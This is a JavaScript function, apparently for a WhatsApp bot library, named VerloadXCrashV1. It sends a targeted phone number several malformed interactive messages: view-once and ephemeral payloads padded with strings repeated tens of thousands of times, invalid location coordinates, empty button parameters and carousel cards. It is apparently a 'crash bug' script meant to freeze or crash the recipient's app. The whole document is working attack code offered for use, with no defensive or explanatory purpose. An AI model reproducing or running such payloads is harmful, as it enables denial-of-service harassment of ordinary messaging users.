async function VerloadXCrashV1(target) {
  try {
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });
    
    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
    const message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟༑⌁⃰VaxzyIsHere.js",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "🩸⃟༑⌁⃰VaxzyIsHere.js".repeat(100000),
                address: "vxz.json".repeat(100000),
              },
            },
            body: {
              text: "🩸⃟༑⌁⃰VaxzyIsHere.js",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };
    
    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ X.json }"
    }
  };
  
  const messageCardsX = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: ""
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: target,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ X.json }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, messageCardsX, { messageId: null });
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}